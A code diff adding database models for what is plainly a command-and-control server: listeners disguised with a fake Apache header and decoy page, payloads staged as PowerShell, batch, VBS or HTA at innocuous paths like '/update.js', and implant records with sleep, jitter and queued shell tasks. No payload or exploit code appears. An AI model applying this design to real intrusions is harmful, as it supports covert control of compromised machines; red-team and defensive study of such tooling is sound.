@@ -155,3 +155,225 @@ class ServerConfig(db.Model):
             entry = cls(key=key, value=str(value))
             db.session.add(entry)
         db.session.commit()
+
+
+# ---------------------------------------------------------------------------
+# Listener Subsystem Models
+# ---------------------------------------------------------------------------
+
+class ListenerProfile(db.Model):
+    __tablename__ = 'listener_profiles'
+
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(128), unique=True, nullable=False)
+    description = db.Column(db.Text, default='')
+    server_header = db.Column(db.String(256), default='Apache/2.4.54 (Ubuntu)')
+    custom_headers = db.Column(db.Text, default='{}')          # JSON
+    default_response_body = db.Column(db.Text, default='<html><body><h1>It works!</h1></body></html>')
+    default_content_type = db.Column(db.String(128), default='text/html')
+    created_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
+    created_at = db.Column(db.DateTime(timezone=True), default=_utcnow)
+
+    listeners = db.relationship('Listener', backref='profile', lazy='dynamic')
+
+    def to_dict(self):
+        import json
+        return {
+            'id': self.id,
+            'name': self.name,
+            'description': self.description,
+            'server_header': self.server_header,
+            'custom_headers': json.loads(self.custom_headers) if self.custom_headers else {},
+            'default_response_body': self.default_response_body,
+            'default_content_type': self.default_content_type,
+            'created_by': self.created_by,
+            'created_at': self.created_at.isoformat(),
+        }
+
+
+class Listener(db.Model):
+    __tablename__ = 'listeners'
+
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(128), unique=True, nullable=False)
+    listener_type = db.Column(db.String(32), nullable=False, default='http')  # http | https
+    bind_address = db.Column(db.String(45), nullable=False, default='0.0.0.0')
+    bind_port = db.Column(db.Integer, nullable=False)
+    status = db.Column(db.String(20), nullable=False, default='stopped')  # stopped|starting|running|error
+    tls_cert_path = db.Column(db.String(512), nullable=True)
+    tls_key_path = db.Column(db.String(512), nullable=True)
+    profile_id = db.Column(db.Integer, db.ForeignKey('listener_profiles.id'), nullable=True)
+    created_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
+    pid = db.Column(db.Integer, nullable=True)
+    last_started_at = db.Column(db.DateTime(timezone=True), nullable=True)
+    last_stopped_at = db.Column(db.DateTime(timezone=True), nullable=True)
+    created_at = db.Column(db.DateTime(timezone=True), default=_utcnow)
+    error_message = db.Column(db.Text, nullable=True)
+
+    callbacks = db.relationship('Callback', backref='listener', lazy='dynamic')
+    staged_payloads = db.relationship('StagedPayload', backref='listener', lazy='dynamic')
+    agents = db.relationship('Agent', backref='listener', lazy='dynamic')
+
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'name': self.name,
+            'listener_type': self.listener_type,
+            'bind_address': self.bind_address,
+            'bind_port': self.bind_port,
+            'status': self.status,
+            'tls_cert_path': self.tls_cert_path,
+            'tls_key_path': self.tls_key_path,
+            'profile_id': self.profile_id,
+            'profile_name': self.profile.name if self.profile else None,
+            'created_by': self.created_by,
+            'pid': self.pid,
+            'last_started_at': self.last_started_at.isoformat() if self.last_started_at else None,
+            'last_stopped_at': self.last_stopped_at.isoformat() if self.last_stopped_at else None,
+            'created_at': self.created_at.isoformat(),
+            'error_message': self.error_message,
+            'callback_count': self.callbacks.count(),
+            'agent_count': self.agents.count(),
+            'staged_count': self.staged_payloads.filter_by(is_active=True).count(),
+        }
+
+
+class Callback(db.Model):
+    __tablename__ = 'callbacks'
+
+    id = db.Column(db.Integer, primary_key=True)
+    listener_id = db.Column(db.Integer, db.ForeignKey('listeners.id'), nullable=False)
+    source_ip = db.Column(db.String(45), nullable=False)
+    source_port = db.Column(db.Integer, nullable=True)
+    hostname = db.Column(db.String(256), nullable=True)
+    user_agent = db.Column(db.String(512), default='')
+    request_method = db.Column(db.String(10), nullable=False)
+    request_path = db.Column(db.String(1024), nullable=False)
+    request_headers = db.Column(db.Text, default='{}')   # JSON
+    request_body = db.Column(db.Text, nullable=True)
+    file_id = db.Column(db.Integer, db.ForeignKey('files.id'), nullable=True)
+    timestamp = db.Column(db.DateTime(timezone=True), default=_utcnow)
+    metadata_json = db.Column(db.Text, nullable=True)     # JSON
+
+    def to_dict(self):
+        import json
+        return {
+            'id': self.id,
+            'listener_id': self.listener_id,
+            'source_ip': self.source_ip,
+            'source_port': self.source_port,
+            'hostname': self.hostname,
+            'user_agent': self.user_agent,
+            'request_method': self.request_method,
+            'request_path': self.request_path,
+            'request_headers': json.loads(self.request_headers) if self.request_headers else {},
+            'request_body': self.request_body,
+            'file_id': self.file_id,
+            'timestamp': self.timestamp.isoformat(),
+            'metadata': json.loads(self.metadata_json) if self.metadata_json else None,
+        }
+
+
+class StagedPayload(db.Model):
+    __tablename__ = 'staged_payloads'
+
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(128), nullable=False)
+    listener_id = db.Column(db.Integer, db.ForeignKey('listeners.id'), nullable=False)
+    payload_type = db.Column(db.String(32), nullable=False, default='raw')  # raw|ps1|bat|vbs|hta
+    content = db.Column(db.Text, nullable=False)
+    content_hash = db.Column(db.String(64), nullable=False)
+    stage_path = db.Column(db.String(256), nullable=False)       # e.g. /update.js
+    is_active = db.Column(db.Boolean, default=True, nullable=False)
+    download_count = db.Column(db.Integer, default=0, nullable=False)
+    created_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
+    created_at = db.Column(db.DateTime(timezone=True), default=_utcnow)
+
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'name': self.name,
+            'listener_id': self.listener_id,
+            'payload_type': self.payload_type,
+            'content_hash': self.content_hash,
+            'stage_path': self.stage_path,
+            'is_active': self.is_active,
+            'download_count': self.download_count,
+            'created_by': self.created_by,
+            'created_at': self.created_at.isoformat(),
+        }
+
+
+# ---------------------------------------------------------------------------
+# C2 Agent Models
+# ---------------------------------------------------------------------------
+
+class Agent(db.Model):
+    __tablename__ = 'agents'
+
+    id = db.Column(db.String(36), primary_key=True)                # UUID
+    hostname = db.Column(db.String(256), nullable=True)
+    username = db.Column(db.String(256), nullable=True)
+    os_info = db.Column(db.String(512), nullable=True)
+    internal_ip = db.Column(db.String(45), nullable=True)
+    external_ip = db.Column(db.String(45), nullable=True)
+    listener_id = db.Column(db.Integer, db.ForeignKey('listeners.id'), nullable=True)
+    sleep_interval = db.Column(db.Integer, default=5, nullable=False)
+    jitter = db.Column(db.Integer, default=10, nullable=False)
+    status = db.Column(db.String(20), default='active', nullable=False)  # active|dormant|dead|disconnected
+    last_seen = db.Column(db.DateTime(timezone=True), default=_utcnow)
+    first_seen = db.Column(db.DateTime(timezone=True), default=_utcnow)
+    metadata_json = db.Column(db.Text, nullable=True)              # JSON
+
+    tasks = db.relationship('AgentTask', backref='agent', lazy='dynamic',
+                            order_by='AgentTask.created_at.desc()')
+
+    def to_dict(self):
+        import json
+        return {
+            'id': self.id,
+            'hostname': self.hostname,
+            'username': self.username,
+            'os_info': self.os_info,
+            'internal_ip': self.internal_ip,
+            'external_ip': self.external_ip,
+            'listener_id': self.listener_id,
+            'sleep_interval': self.sleep_interval,
+            'jitter': self.jitter,
+            'status': self.status,
+            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
+            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
+            'metadata': json.loads(self.metadata_json) if self.metadata_json else None,
+            'task_count': self.tasks.count(),
+        }
+
+
+class AgentTask(db.Model):
+    __tablename__ = 'agent_tasks'
+
+    id = db.Column(db.String(36), primary_key=True)                # UUID
+    agent_id = db.Column(db.String(36), db.ForeignKey('agents.id'), nullable=False)
+    command = db.Column(db.Text, nullable=False)
+    task_type = db.Column(db.String(32), default='shell', nullable=False)
+    status = db.Column(db.String(20), default='queued', nullable=False)  # queued|sent|completed|failed
+    created_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
+    created_at = db.Column(db.DateTime(timezone=True), default=_utcnow)
+    sent_at = db.Column(db.DateTime(timezone=True), nullable=True)
+    completed_at = db.Column(db.DateTime(timezone=True), nullable=True)
+    result = db.Column(db.Text, nullable=True)
+    success = db.Column(db.Boolean, nullable=True)
+
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'agent_id': self.agent_id,
+            'command': self.command,
+            'task_type': self.task_type,
+            'status': self.status,
+            'created_by': self.created_by,
+            'created_at': self.created_at.isoformat(),
+            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
+            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
+            'result': self.result,
+            'success': self.success,
+        }
